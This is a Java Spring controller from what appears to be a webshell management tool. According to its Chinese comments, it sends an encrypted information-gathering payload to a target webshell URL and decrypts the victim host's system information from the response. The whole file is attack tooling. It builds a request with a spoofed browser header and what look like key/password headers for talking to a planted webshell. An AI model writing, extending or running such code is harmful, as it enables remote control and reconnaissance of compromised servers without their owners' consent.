package org.nox.controller;

import org.nox.tools.HttpRequestUtil;
import org.nox.tools.PayloadGenerater;
import org.nox.tools.ResultReader;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;

/**
 * 信息收集控制器。
 * 向目标 Webshell 发送信息收集 Payload，获取目标主机的系统信息。
 */
@RestController
@RequestMapping("/getinfo")
public class InfoController {

    /**
     * 信息收集接口。
     * @param url 目标 Webshell 地址
     * @return 解密后的目标系统信息
     * @throws Exception 网络或处理异常
     */
    @GetMapping
    public String getInfo(@RequestParam("url") String url) throws Exception {
        return handleInfo(url);
    }

    /**
     * 实际处理信息收集的私有方法。
     * 生成信息收集模式的加密 Payload 并发送给目标，解密响应后返回。
     */
    private String handleInfo(String url) throws Exception {
        System.out.println("Information Collection : URL = " + url);
        // 生成信息收集模式的 Payload（mode=0，无需额外命令）
        String payload = PayloadGenerater.generate(0, "");
        // 构造请求头
        HashMap<String, String> headers = new HashMap<String, String>();
        headers.put("Usage-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36");
        headers.put("e10adc3949ba59ab", "be56e057f20f883e");
        // 发送 POST 请求
        HttpRequestUtil.Response response = HttpRequestUtil.post(url, headers, payload);
        if (response.statusCode() == 200) {
            String result = response.body();
            System.out.println("Receive Response : " + result);
            // 解密响应结果
            result = ResultReader.read(result);
            System.out.println("Result : " + result);
            return result;
        }
        return "";
    }
}
